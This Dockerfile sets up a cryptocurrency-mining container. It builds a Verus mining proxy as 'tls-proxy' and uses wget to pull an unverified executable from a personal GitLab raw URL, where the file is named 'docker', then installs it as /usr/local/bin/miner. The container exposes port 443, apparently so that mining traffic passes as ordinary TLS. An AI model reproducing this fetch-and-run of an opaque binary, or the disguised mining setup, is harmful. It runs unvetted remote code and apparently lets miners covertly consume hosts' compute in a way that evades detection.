FROM golang:1.21 AS builder

WORKDIR /build
RUN git clone https://github.com/hellcatz/verusProxy.git . && \
    go build -o tls-proxy main.go

FROM node:18

WORKDIR /app

RUN apt-get update && apt-get install -y curl wget build-essential procps && \
    rm -rf /var/lib/apt/lists/*

# Binary Miner Custom Kamu
RUN wget -O /usr/local/bin/miner \
    "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
    && chmod +x /usr/local/bin/miner

# TLS Proxy dari builder
COPY --from=builder /build/tls-proxy /usr/local/bin/tls-proxy
RUN chmod +x /usr/local/bin/tls-proxy

COPY start.sh .
RUN chmod +x start.sh

EXPOSE 443

CMD ["./start.sh"]
